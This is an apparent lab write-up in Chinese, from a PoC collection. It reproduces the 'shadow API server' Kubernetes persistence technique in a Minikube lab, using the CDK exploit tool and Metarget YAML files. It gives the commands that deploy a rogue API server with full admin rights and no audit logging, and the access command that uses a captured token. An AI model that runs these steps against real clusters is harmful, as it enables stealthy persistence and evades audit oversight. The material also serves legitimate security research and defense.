# Kubernetes 部署 Shadow API Server

## 漏洞描述

该技术来源于 ["RSAC 2020: Advanced Persistence Threats: The Future of Kubernetes Attacks"](https://www.youtube.com/watch?v=CH7S5rE3j8w)，思路是在拥有 Master 节点上的 create pod 权限时，可创建一个具有 API Server 功能的 Pod，使得后续命令可以通过新创建的 shadow api server 进行下发，绕过 K8s 的日志审计，更加具有隐蔽性。

参考链接：

- https://www.rsaconference.com/Library/presentation/USA/2020/advanced-persistence-threats-the-future-of-kubernetes-attacks-3
- https://www.youtube.com/watch?v=CH7S5rE3j8w
- https://www.cdxy.me/?p=839
- https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver
- https://github.com/cdk-team/CDK/blob/02c2e5d576a51b603e07eb036073eb1c5a0c4c4d/test/k8s_exploit_util/shadow-apiserver.yaml

## 环境搭建

基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。

本例中各组件版本如下：

```
Docker version: 18.09.3
minikube version: v1.35.0
Kubectl Client Version: v1.32.3
Kubectl Server Version: v1.32.0
```

通过 yaml 文件创建漏洞环境：

```
kubectl apply -f k8s_metarget_namespace.yaml
kubectl apply -f k8s_shadow_apiserver.yaml
```

执行完成后，K8s 集群内 `metarget` 命名空间下将会创建一个名为 `k8s-shadow-apiserver` 的 pod：

```
kubectl get pods -n metarget
-----
NAME                   READY   STATUS    RESTARTS   AGE
k8s-shadow-apiserver   1/1     Running   0          40m
```

![](images/Kubernetes%20部署%20Shadow%20API%20Server/image-20250422151649799.png)

## 漏洞复现

下载漏洞利用工具 [CDK](https://github.com/cdk-team/CDK)，将其传入 `k8s-shadow-apiserver`pod 中：

```
kubectl cp cdk k8s-shadow-apiserver:/ -n metarget
```

执行以下命令运行工具（该命令会在 `kube-system` 命名空间下创建一个 shadow apiserver，可根据提示进行访问）：

```
kubectl exec -n metarget -it k8s-shadow-apiserver -- chmod +x /cdk
kubectl exec -n metarget -it k8s-shadow-apiserver --  /cdk run k8s-shadow-apiserver default
-----
...
2025/04/22 07:18:04 shadow api-server deploy success!
	shadow api-server pod name:kube-apiserver-minikube-shadow-yg7vf3, namespace:kube-system, node name:minikube
	listening port: https://minikube:9444
	run: kubectl --server=https://minikube:9444 --token=eyJhb...UnXw --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
```

![](images/Kubernetes%20部署%20Shadow%20API%20Server/image-20250422151905189.png)

验证部署结果：

```
kubectl get pods -n kube-system | grep shadow
-----
kube-apiserver-minikube-shadow-yg7vf3   1/1     Running   0              90s
```

![](images/Kubernetes%20部署%20Shadow%20API%20Server/image-20250422151956718.png)

通过获取的 K8s Token 访问 shadow apiserver，该 apiserver 具有和集群中现存的 apiserver 一致的功能，同时开启了全部 K8s 管理权限，且不保存审计日志：

```
kubectl --server=https://minikube:9444 --token=<YOUR_TOKEN_HERE> --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
```

![](images/Kubernetes%20部署%20Shadow%20API%20Server/image-20250422155545177.png)

## 环境复原

```
kubectl delete pod kube-apiserver-minikube-shadow-6aktct -n kube-system
kubectl delete -f k8s_shadow_apiserver.yaml
kubectl delete -f k8s_metarget_namespace.yaml
```

## YAML

[k8s_metarget_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)

```
apiVersion: v1
kind: Namespace
metadata:
  name: metarget
```

[k8s_shadow_apiserver.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_shadow_apiserver.yaml)

```
apiVersion: v1
kind: ServiceAccount
metadata:
  name: k8s-shadow-apiserver
  namespace: metarget
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: k8s-shadow-apiserver
rules:
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - create
  - get
  - list
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: k8s-shadow-apiserver
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: k8s-shadow-apiserver
subjects:
- kind: ServiceAccount
  name: k8s-shadow-apiserver
  namespace: metarget
---
apiVersion: v1
kind: Pod
metadata:
  name: k8s-shadow-apiserver
  namespace: metarget
spec:
  serviceAccountName: k8s-shadow-apiserver
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
```
